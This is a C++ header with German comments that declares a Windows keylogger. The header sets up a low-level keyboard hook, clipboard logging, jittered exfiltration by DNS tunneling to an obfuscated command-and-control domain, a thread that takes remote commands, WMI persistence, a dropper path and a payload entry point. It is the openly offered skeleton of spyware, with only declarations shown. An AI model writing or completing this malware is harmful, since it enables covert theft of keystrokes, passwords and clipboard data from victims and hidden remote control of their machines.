#ifndef LOGGER_H
#define LOGGER_H

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <Dnsapi.h>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include "config.h"
#include "obfuscated_string.h" // Für C2-Domain-Verschleierung

// Linker-Anweisung für die DNS-API-Bibliothek
#pragma comment(lib, "dnsapi.lib")

// --- Konfiguration (wird später gehärtet) ---
constexpr int BASE_INTERVAL = 600; // 10 Minuten
constexpr int JITTER = 180;        // +/- 3 Minuten

class Logger {
public:
    // NEU: Konstruktor, der den Pfad des Droppers akzeptiert
    Logger(const wchar_t* dropperPath);
    ~Logger();

    // Startet den Keylogger. Setzt den Hook und startet den Exfiltrations-Thread.
    void run();

    // Statische Member für den globalen Zugriff aus dem Hook
    static Logger* instance;
    static HHOOK keyboardHook;
    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

private:
    // Verarbeitet einen Tastencode und fügt ihn zum internen Puffer hinzu.
    void processKeystroke(DWORD vkCode);

    // Der Thread, der für die Datenexfiltration zuständig ist.
    void exfiltrationThread();

    // Sendet Daten über DNS-Tunneling.
    void sendDataViaDNS(const std::string& data);

    // Konvertiert einen virtuellen Key-Code in eine (vereinfachte) Zeichenkette.
    std::string vkCodeToString(DWORD vkCode);

    // NEU: Fragt nach Befehlen und verarbeitet sie.
    void commandAndControlThread();
    void handleCommand(const std::string& command);

    // NEU: Thread zur Überwachung der Zwischenablage
    void clipboardLoggingThread();

    // NEU: Persistenz-Funktionen
    void handlePersistCommand(const std::vector<std::string>& parts);
    bool persistEnableWMI();
    bool persistDisableWMI();

    // --- Member-Variablen ---

    // Puffer für die gesammelten Tastenschläge.
    std::vector<std::string> keystrokeBuffer;
    
    // Mutex, um den Puffer vor gleichzeitigem Zugriff zu schützen.
    std::mutex bufferMutex;

    // Konfiguration für Exfiltration
    std::atomic<int> baseInterval;
    std::atomic<int> jitter;

    // NEU: Pfad zum ursprünglichen Dropper
    std::wstring dropperPath_;

    // NEU: Speichert den letzten Inhalt, um Duplikate zu vermeiden.
    std::string lastClipboardContent;

    // Verschleierte C2-Domain
    ObfuscatedString<32> c2_domain_obf = ObfuscatedString<32>("your.c2.domain.com");
};

// NEU: Globaler Einstiegspunkt für den Payload
DWORD WINAPI PayloadEntry(LPVOID lpParameter);

#endif // LOGGER_H 